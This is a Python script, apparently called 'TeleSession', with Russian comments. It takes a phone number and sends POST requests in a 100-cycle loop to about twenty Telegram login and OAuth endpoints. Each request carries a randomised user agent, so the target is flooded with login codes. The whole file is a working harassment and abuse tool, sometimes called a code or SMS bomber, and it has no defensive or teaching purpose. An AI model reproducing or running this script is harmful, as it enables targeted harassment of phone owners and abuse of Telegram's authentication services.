import requests
import fake_useragent
import pyfiglet
from termcolor import colored



# ASCII-арт приветствия
ascii_banner = pyfiglet.figlet_format("TeleSession")
colored_banner = colored(ascii_banner, color='magenta')  # Красим в цвет
print(colored_banner)

def send_requests(phone_number, repeat_count=100):
    """
    Отправляет POST-запросы на указанные URL с заданным количеством повторений.

    :param phone_number: Номер телефона для отправки.
    :param repeat_count: Количество повторений отправки запросов.
    """
    count = 0
    for _ in range(repeat_count):
        try:
            user_agent = fake_useragent.UserAgent().random
            headers = {'user-agent': user_agent}
            data = {'phone': phone_number}

            urls = [
                'https://translations.telegram.org/auth/request',
                'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
                'https://oauth.telegram.org/auth/request?bot_id=547043436&origin=https%3A%2F%2Fcore.telegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcore.telegram.org%2Fwidgets%2Flogin',
                'https://oauth.telegram.org/auth/request?bot_id=5622428414&origin=https%3A%2F%2Fapp.domino-crm.com&embed=1&request_access=write&return_to=https%3A%2F%2Fapp.domino-crm.com%2Fauth%3F_ym_uid%3D1746538716380066612%26_gl%3D1%2A9we8yl%2A_ga%2AMTQ3ODAyNDA2My4xNzQ2NTM4NzE2%2A_ga_ZH8ZRTH98K%2AczE3NDY1Mzg3MTYkbzEkZzAkdDE3NDY1Mzg3MTYkajAkbDAkaDA.%2A_gcl_au%2AMTc0MjM5ODEyOS4xNzQ2NTM4NzE2%2A_ga_GSV1DDFXEP%2AczE3NDY1Mzg3MTYkbzEkZzAkdDE3NDY1Mzg3MTYkajYwJGwwJGgw%26tab%3DsignIn',
                'https://oauth.telegram.org/auth/request?bot_id=5082101769&origin=https%3A%2F%2Fauth.smartbotpro.ru&request_access=write&lang=ru&return_to=https%3A%2F%2Fauth.smartbotpro.ru%2Fauth%2Flogin%2F%3Futm_source%3Dyandex',
                'https://oauth.telegram.org/auth/request?bot_id=6128168231&origin=https%3A%2F%2Fweb.botbrother.ru&embed=1&return_to=https%3A%2F%2Fweb.botbrother.ru%2F',
                'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
                'https://oauth.telegram.org/auth/request?bot_id=5586841634&origin=https%3A%2F%2Fid.skyeng.ru',
                'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
                'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
                'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
                'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
                'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
                'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
                'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
                'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
                'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
                'https://my.telegram.org/auth/send_password'
            ]

            for url in urls:
                requests.post(url, headers=headers, data=data)

            count += 1
            print(colored(f"Коды успешно отправлены", 'cyan'))
            print(colored(f"Всего циклов: {count}", 'cyan'))
        except Exception as e:
            print(colored(f"[!] Ошибка при отправке запросов: {e}", 'red'))
            break

if __name__ == "__main__":
    phone_number = input("Введите номер телефона: ")
    send_requests(phone_number)